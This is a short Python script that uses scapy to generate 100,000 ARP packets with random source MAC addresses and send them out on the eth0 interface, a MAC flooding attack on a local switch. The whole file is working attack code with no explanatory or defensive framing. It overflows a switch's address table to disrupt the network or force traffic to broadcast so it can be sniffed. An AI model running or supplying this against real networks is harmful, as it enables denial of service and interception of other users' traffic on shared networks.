from scapy.all import *
import sys

def mac_flood(packets):
    sendp(packets, iface='eth0') # Send all packets on layer 2
    print("Finished packet flood")

def main():
    num_of_packets = 100000
    packets = []

    # Generate packets beforehand for faster transmission
    for i in range(num_of_packets):
        packets.append(ARP(hwsrc = RandMAC()))
        
    mac_flood(packets)

main()